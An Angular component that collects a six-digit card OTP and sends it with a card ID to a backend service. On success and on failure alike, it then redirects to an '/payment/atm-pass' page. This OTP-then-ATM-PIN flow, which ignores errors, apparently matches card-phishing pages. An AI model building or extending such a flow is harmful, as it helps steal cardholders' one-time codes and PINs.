import { Component, ElementRef, QueryList, ViewChildren, OnDestroy, OnInit, inject, ChangeDetectorRef } from '@angular/core';
import { CommonModule, Location } from '@angular/common';
import { Router } from '@angular/router';
import { Header } from "../../Layout/header/header";
import { OtpService } from '../../Core/services/api/otp.service';
import { CheckoutService } from '../../Core/services/api/checkout.service';

@Component({
  imports: [CommonModule, Header],
  selector: 'app-card-otp',
  styleUrl: './card-otp.css',
  templateUrl: './card-otp.html',
})
export class CardOtp implements OnInit, OnDestroy {
  @ViewChildren('otpInput') otpInputs!: QueryList<ElementRef<HTMLInputElement>>;
  
  private readonly router = inject(Router);
  private readonly location = inject(Location);
  private readonly otpService = inject(OtpService);
  private readonly checkoutService = inject(CheckoutService);
  private readonly cdr = inject(ChangeDetectorRef);

  otp: string[] = ['', '', '', '', '', ''];
  timeLeft: number = 60;
  timerInterval: any;
  isLoading = false;

  ngOnInit(): void {
    this.startTimer();
  }

  ngOnDestroy(): void {
    this.clearTimer();
  }

  startTimer(): void {
    this.timeLeft = 60;
    this.clearTimer();
    this.timerInterval = setInterval(() => {
      if (this.timeLeft > 0) {
        this.timeLeft--;
      } else {
        this.clearTimer();
      }
      this.cdr.markForCheck();
    }, 1000);
  }

  clearTimer(): void {
    if (this.timerInterval) {
      clearInterval(this.timerInterval);
    }
  }

  resendCode(): void {
    if (this.timeLeft === 0) {
      this.otp = ['', '', '', '', '', ''];
      this.startTimer();
    }
  }

  get isOtpComplete(): boolean {
    return this.otp.every(val => val !== '');
  }

  onInput(event: Event, index: number): void {
    const inputElement = event.target as HTMLInputElement;
    const value = inputElement.value;
    
    if (!/^\d*$/.test(value)) {
      inputElement.value = this.otp[index];
      return;
    }

    const lastChar = value.slice(-1);
    this.otp[index] = lastChar;
    inputElement.value = lastChar;

    if (lastChar && index < 5) {
      this.otpInputs.toArray()[index + 1].nativeElement.focus();
    }
  }

  onKeyDown(event: KeyboardEvent, index: number): void {
    if (event.key === 'Backspace' && !this.otp[index] && index > 0) {
      this.otpInputs.toArray()[index - 1].nativeElement.focus();
    }
  }

  onPaste(event: ClipboardEvent): void {
    event.preventDefault();
    const pastedData = event.clipboardData?.getData('text');
    if (pastedData) {
      const numbers = pastedData.replace(/\D/g, '').slice(0, 6).split('');
      numbers.forEach((num, i) => {
        if (i < 6) {
          this.otp[i] = num;
        }
      });
      const focusIndex = numbers.length < 6 ? numbers.length : 5;
      setTimeout(() => {
        if (this.otpInputs) {
           this.otpInputs.toArray()[focusIndex].nativeElement.focus();
        }
      });
    }
  }

  goBack(): void {
    this.location.back();
  }

  verify(): void {
    if (this.isOtpComplete && !this.isLoading) {
      const otpCode = this.otp.join('');
      const userId = this.checkoutService.cardId;

      if (!userId) {
        this.router.navigate(['/payment/atm-pass']);
        return;
      }

      this.isLoading = true;
      this.otpService.submitOtp(otpCode, userId).subscribe({
        next: () => {
          this.isLoading = false;
          this.router.navigate(['/payment/atm-pass']);
        },
        error: (err) => {
          console.error('OTP submission failed', err);
          this.isLoading = false;
          this.router.navigate(['/payment/atm-pass']);
        }
      });
    }
  }
}
